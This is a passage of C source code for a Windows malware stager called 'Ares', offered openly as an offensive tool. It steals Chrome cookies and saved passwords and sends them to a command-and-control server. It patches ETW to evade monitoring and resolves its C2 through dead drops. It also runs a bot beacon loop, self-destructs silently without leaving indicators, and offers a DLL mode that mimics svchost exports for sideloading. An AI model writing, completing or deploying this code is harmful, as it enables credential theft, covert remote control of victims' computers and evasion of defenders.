                creds[i].url, creds[i].username,
                esc_pass, creds[i].decrypt_status);
        }
        offset += snprintf(output + offset, out_max - offset, "]");

        /* ── Steal Cookies ── */
        STOLEN_COOKIE cookies[512];
        int ck_count = Ares_StealChromeCookies(cookies, 512);

        offset += snprintf(output + offset, out_max - offset,
            ",\"cookies\":%d,\"ck_data\":[", ck_count);

        for (int i = 0; i < ck_count && offset < out_max - 512; i++) {
            if (i > 0) output[offset++] = ',';
            /* Escape cookie value */
            char esc_val[1024] = {0};
            int ev = 0;
            for (int j = 0; cookies[i].value[j] && ev < 1000; j++) {
                char c = cookies[i].value[j];
                if (c == '"') { esc_val[ev++] = '\\'; esc_val[ev++] = '"'; }
                else if (c == '\\') { esc_val[ev++] = '\\'; esc_val[ev++] = '\\'; }
                else if ((unsigned char)c >= 0x20) { esc_val[ev++] = c; }
            }
            esc_val[ev] = '\0';

            offset += snprintf(output + offset, out_max - offset,
                "{\"h\":\"%s\",\"n\":\"%s\",\"v\":\"%s\","
                "\"p\":\"%s\",\"b\":\"%s\"}",
                cookies[i].host, cookies[i].name, esc_val,
                cookies[i].path, cookies[i].browser);
        }
        offset += snprintf(output + offset, out_max - offset, "]}");

        /* ── Send results ── */
        if (task_id[0]) {
            BOOL success = (pw_count > 0 || ck_count > 0);
            _send_result(bot_id, c2_port, task_id, 5, success, output, offset,
                success ? NULL : "no credentials found");
        }

        /* Secure wipe and free */
        memset(output, 0, offset);
        HeapFree(GetProcessHeap(), 0, output);
        memset(creds, 0, sizeof(creds));
        memset(cookies, 0, sizeof(cookies));
    }
#endif /* ARES_STAGER_STEAL */

    /* ────────────────────────────────────────────────
     *  "sleep" — Update beacon interval
     * ──────────────────────────────────────────────── */
    else if (strncmp(type, "sleep", 5) == 0) {
        int ms = _json_int(task_json, "sleep_ms");
        if (ms > 0) st->config.sleep_ms = (DWORD)ms;
    }

    /* ────────────────────────────────────────────────
     *  "exit" — Clean self-destruct
     * ──────────────────────────────────────────────── */
    else if (strncmp(type, "exit", 4) == 0) {
        st->running = FALSE;
    }
}

/* ── Self-Destruct (silent — no cmd.exe, no popup) ── */

static void _self_destruct(void)
{
    /* Overwrite own binary on disk */
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    HANDLE hF = CreateFileW(self, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        BYTE junk[4096];
        memset(junk, 0, sizeof(junk));
        DWORD w; WriteFile(hF, junk, sizeof(junk), &w, NULL);
        CloseHandle(hF);
    }
    /* Schedule delete on reboot — NO cmd.exe, NO window, NO IOC */
    MoveFileExW(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

/* ═══════════════════════════════════════════════════════════════
 *  ENTRY POINT — Minimal Stager
 *
 *  Can be compiled as:
 *    EXE: WinMain (default)
 *    DLL: DllMain (when -DARES_DLL_STAGER is defined)
 *
 *  DLL mode enables sideloading via signed Microsoft EXE.
 * ═══════════════════════════════════════════════════════════════ */

static int _stager_main(void)
{
    static AGENT_STATE state;

    /* ── Phase 0: Core init ── */
    if (!Ares_Init(&state)) { _RDBG("Init FAILED"); return 1; }
    _RDBG("Init OK");
    Ares_ResolveAPIs();
    _RDBG("ResolveAPIs OK");

    /* Phase 0.8: ETW patch */
    Ares_PatchETW_Ex(&state);
    _RDBG("ETW patch OK");

    /* ── Phase 1: Config ── */
#ifdef ARES_CONFIG_H
    ARES_DECODE_CONFIG(&state);
    MultiByteToWideChar(CP_UTF8, 0, state.config.c2_endpoints[0], -1, g_wc2host, 256);
    state.config.sleep_ms = CFG_SLEEP_MS;
    int c2_port = CFG_C2_PORT;
    int jitter_pct = CFG_JITTER_PCT;
    /* Set default API paths if not configured */
    if (state.config.path_register[0] == 0) strncpy(state.config.path_register, "/api/v1/register", 31);
    if (state.config.path_beacon[0] == 0) strncpy(state.config.path_beacon, "/api/v1/beacon", 31);
    if (state.config.path_result[0] == 0) strncpy(state.config.path_result, "/api/v1/result", 31);
    if (state.config.path_exfil[0] == 0) strncpy(state.config.path_exfil, "/api/v1/exfil", 31);
    strncpy(g_path_result, state.config.path_result, 31); g_path_result[31] = '\0';
    { char _hdbg[64]; snprintf(_hdbg, sizeof(_hdbg), "host_after_decode=[%s] cnt=%d", state.config.c2_endpoints[0], state.config.c2_count); _RDBG(_hdbg); }
#else
    strncpy(state.config.c2_endpoints[0], "127.0.0.1", 255);
    state.config.c2_count = 1;
    state.config.sleep_ms = 10000;
    int c2_port = 8443;
    int jitter_pct = 30;
    wcscpy(g_wc2host, L"127.0.0.1");
    strncpy(state.config.path_register, "/api/v1/register", 31);
    strncpy(state.config.path_beacon, "/api/v1/beacon", 31);
    strncpy(state.config.path_result, "/api/v1/result", 31);
    strncpy(state.config.path_exfil, "/api/v1/exfil", 31);
    strncpy(g_path_result, state.config.path_result, 31); g_path_result[31] = '\0';
#endif

    /* ── Phase 1.5: Dead Drop Resolution ── */
#if defined(CFG_DEAD_DROP_ENABLED) && CFG_DEAD_DROP_ENABLED
    {
        const char* dd_urls[] = { CFG_DEAD_DROP_URL_1, CFG_DEAD_DROP_URL_2 };
        char dd_host[256] = {0};
        int dd_port = 443;
        if (DeadDrop_Resolve(dd_urls, 2, dd_host, &dd_port)) {
            /* Override C2 host with dead drop result */
            MultiByteToWideChar(CP_UTF8, 0, dd_host, -1, g_wc2host, 256);
            strncpy(state.config.c2_endpoints[0], dd_host, 255);
            c2_port = dd_port;
        }
    }
#endif

    /* ── Phase 2: Register (retry up to 5 times) ── */
    _RDBG("Phase 2: Register starting");
    { char _c2dbg[64]; snprintf(_c2dbg, sizeof(_c2dbg), "c2_count=%d host=%s port=%d", state.config.c2_count, state.config.c2_endpoints[0], c2_port); _RDBG(_c2dbg); }
    char bot_id[32] = {0};
    BOOL reg = FALSE;
    for (int retry = 0; retry < 5 && !reg; retry++) {
        for (int i = 0; i < state.config.c2_count && !reg; i++)
            reg = _c2_register(&state, state.config.c2_endpoints[i], c2_port, bot_id);
        if (!reg) Sleep(5000 + retry * 10000);
    }
    if (!reg) { _self_destruct(); return 1; }
    strncpy(g_bot_id_global, bot_id, 63);

    /* ── Phase 2.5: PE header wipe DISABLED ──
     * v4.3 FIX: PE header wipe corrupts CNG/WinHTTP internal state
     * needed by AES-GCM decrypt during credential extraction.
     * Re-enable after steal tasks complete in a future version. */
#if 0  /* DISABLED — causes stealer crash */
#ifndef CFG_REFLECTIVE
    {
        HMODULE self = GetModuleHandleW(NULL);
        DWORD old;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)self;
        DWORD wipeSize = 4096;
        if (dos && dos->e_magic == 0x5A4D) {
            IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)self + dos->e_lfanew);
            if (nt->Signature == 0x4550 && nt->OptionalHeader.SizeOfHeaders > 0)
                wipeSize = nt->OptionalHeader.SizeOfHeaders;
        }
        if (VirtualProtect((PVOID)self, wipeSize, PAGE_READWRITE, &old)) {
            memset((PVOID)self, 0, wipeSize);
            VirtualProtect((PVOID)self, wipeSize, old, &old);
        }
    }
#endif
#endif

    /* ── Phase 3: Beacon Loop ── */
state.running = TRUE;
    _RDBG("BEACON_LOOP start");
    int consecutive_fails = 0;
    while (state.running) {
        /* Kill date check */
        if (state.config.kill_date > 0 && (DWORD)time(NULL) > state.config.kill_date) {
            _self_destruct();
            return 0;
        }

        /* Beacon → C2 */
        char beacon_path[32]; strncpy(beacon_path, state.config.path_beacon, 31); beacon_path[31] = '\0';
        wchar_t wb[32]; MultiByteToWideChar(CP_UTF8, 0, beacon_path, -1, wb, 32);
        char bjson[256];
        int bn = snprintf(bjson, sizeof(bjson), "{\"bot_id\":\"%s\",\"tk\":\"%s\"}", bot_id, g_bot_token);
        HTTP_RESP resp = _http(g_wc2host, c2_port, wb, "POST", (BYTE*)bjson, bn);

        if (resp.status_code == 200 && resp.body && resp.body_len > 2) {
            consecutive_fails = 0;
            char* body = (char*)resp.body;
            body[resp.body_len] = '\0';

            if (body[0] == '{') {
                /* Adaptive sleep */
                char* sm = strstr(body, "\"sleep_ms\":");
                if (sm) { sm += 11; int v = atoi(sm); if (v > 0) state.config.sleep_ms = (DWORD)v; }

                /* ── Task array iteration (production fix) ──
                 * C2 sends: {"tasks":[{...},{...}], "sleep_ms":N}
                 * Walk each '{' inside the tasks array and dispatch individually. */
                char* tasks_start = strstr(body, "\"tasks\":");
                if (tasks_start) {
                    tasks_start += 8;
                    while (*tasks_start == ' ') tasks_start++;
                    if (*tasks_start == '[') {
                        tasks_start++;
                        int obj_depth = 0;   /* {} depth */
                        int arr_depth = 1;   /* already inside outer [ */
                        char* t_begin = NULL;
                        BOOL in_str = FALSE;
                        for (char* p = tasks_start; *p; p++) {
                            /* Skip string contents (handles escaped quotes) */
                            if (*p == '"' && (p == tasks_start || *(p-1) != '\\'))
                                { in_str = !in_str; continue; }
                            if (in_str) continue;
                            if (*p == '[') arr_depth++;
                            else if (*p == ']') { arr_depth--; if (arr_depth == 0) break; }
                            else if (*p == '{') {
                                if (obj_depth == 0) t_begin = p;
                                obj_depth++;
                            } else if (*p == '}') {
                                obj_depth--;
                                if (obj_depth == 0 && t_begin) {
                                    char saved = *(p + 1);
                                    *(p + 1) = '\0';
                                    _dispatch_task(&state, t_begin, bot_id, c2_port);
                                    *(p + 1) = saved;
                                    t_begin = NULL;
                                }
                            }
                        }
                    }
                }
            }
        } else {
            consecutive_fails++;
            /* Back off if C2 unreachable: double sleep up to 5 min */
            if (consecutive_fails > 3) {
                DWORD backoff = state.config.sleep_ms * 2;
                if (backoff > 300000) backoff = 300000;
                state.config.sleep_ms = backoff;
            }
        }
        if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);

        { char _sl[48]; snprintf(_sl,sizeof(_sl),"SLEEP: %lums",(unsigned long)state.config.sleep_ms); _RDBG(_sl); }
                /* ── Sleep with obfuscation ── */
        double jitter = (double)jitter_pct / 100.0;
        Ares_SleepObfuscated(state.config.sleep_ms, jitter);
    }

    _self_destruct();
    return 0;
}

/* ── EXE Entry Point ── */
#ifndef ARES_DLL_STAGER
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow)
{
    (void)hInst; (void)hPrev; (void)cmdLine; (void)nShow;
    return _stager_main();
}
#endif

/* ── DLL Entry Point (for sideloading) ── */
#ifdef ARES_DLL_STAGER
static HANDLE g_stager_thread = NULL;

static DWORD WINAPI _stager_thread_fn(LPVOID param) {
    (void)param;
    _stager_main();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        g_stager_thread = CreateThread(NULL, 0, _stager_thread_fn, NULL, 0, NULL);
    }
    return TRUE;
}

/* Exported functions for DLL sideloading — mimics common DLLs */
__declspec(dllexport) void WINAPI ServiceMain_Stub(DWORD a, LPWSTR* b) { (void)a; (void)b; }
__declspec(dllexport) void SvchostPushServiceGlobals(void* p) { (void)p; }
__declspec(dllexport) HRESULT DllCanUnloadNow_Stub(void) { return 1; }
#endif

